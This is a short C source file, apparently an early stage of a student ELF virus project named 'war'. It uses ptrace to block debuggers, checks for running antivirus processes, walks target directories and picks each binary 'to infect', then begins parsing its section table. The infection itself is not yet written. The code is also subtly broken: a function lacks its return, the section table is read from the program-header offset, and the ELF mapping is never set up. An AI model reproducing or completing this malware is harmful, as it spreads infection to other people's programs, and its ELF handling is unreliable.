#include "../incl/war.h"

int ft_checkarg(t_war *war)
{
    war->fd = open(war->binary, O_RDONLY);
    if (war->fd == -1)
        return (-1);
    if (fstat(war->fd, &war->file_info) == -1)
    {
        close(war->fd);
        return (-1);
    }
}

int main(void)
{
    t_war   *war;
    char    path[1024];
    int     i = 0;

    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
        exit(1);
    war = malloc(sizeof(t_war));
    if (!war)
        return (1);
    war->antivirus = 0;
    ft_antiprocess(war);

    if (war->antivirus != 1)
    {
        for (int i = 0; i < 2; i++)
        {
            war->dir = opendir(ft_getdir(i));
            if (war->dir)
            {
                while ((war->read_dir = readdir(war->dir)) != NULL)
                {
                    snprintf(path, sizeof(path), "%s/%s", ft_getdir(i), war->read_dir->d_name);
                    if (war->read_dir->d_name[0] == '.')
                        continue;
                    war->binary = path;
                    if (ft_checkarg(war) == -1)
                        continue;
                    printf("Este es el ELF a infectar ( %s )\n", war->binary);
                    war->sectab = (Elf64_Shdr *)(war->elf + war->header->e_phoff);
                    war->strtab = (char *)(war->elf + war->sectab[war->header->e_shstrndx].sh_offset);

                }
                
            }
            closedir(war->dir);
        }
    }

    return (0);
}